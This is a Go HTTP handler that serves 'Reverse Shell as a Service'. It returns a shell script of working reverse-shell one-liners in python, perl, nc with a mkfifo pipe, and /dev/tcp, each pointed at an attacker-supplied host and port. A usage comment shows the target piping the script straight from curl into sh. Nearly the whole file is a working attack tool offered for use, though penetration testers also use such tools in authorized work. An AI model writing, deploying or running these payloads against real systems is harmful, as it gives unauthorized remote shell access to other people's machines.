package handler

import (
	"fmt"
	"net/http"
	"strings"
)

const usage = `# Reverse Shell as a Service
# https://github.com/lukechilds/reverse-shell
#
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://reverse-shell.sh/yourip:1337 | sh
#
# 3. Don't be a dick`

type payload struct {
	cmd  string
	code string
}

func ReverseShell(address string) string {
	host, port, ok := strings.Cut(address, ":")
	if !ok || host == "" || port == "" {
		return usage
	}

	payloads := []payload{
		{"python", fmt.Sprintf(`python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("%s",%s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`, host, port)},
		{"perl", fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, host, port)},
		{"nc", fmt.Sprintf(`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f`, host, port)},
		{"sh", fmt.Sprintf(`/bin/sh -i >& /dev/tcp/%s/%s 0>&1`, host, port)},
	}

	script := usage
	for _, p := range payloads {
		script += fmt.Sprintf("\n\nif command -v %s > /dev/null 2>&1; then\n\t%s\n\texit;\nfi", p.cmd, p.code)
	}

	return script
}

func Handler(w http.ResponseWriter, r *http.Request) {
	address := strings.TrimPrefix(r.URL.Path, "/")
	oneMonth := 60 * 60 * 24 * 30

	w.Header().Set("Content-Type", "text/plain")
	w.Header().Set("Cache-Control", fmt.Sprintf("s-maxage=%d", oneMonth)) // Cache at edge
	fmt.Fprint(w, ReverseShell(address))
}
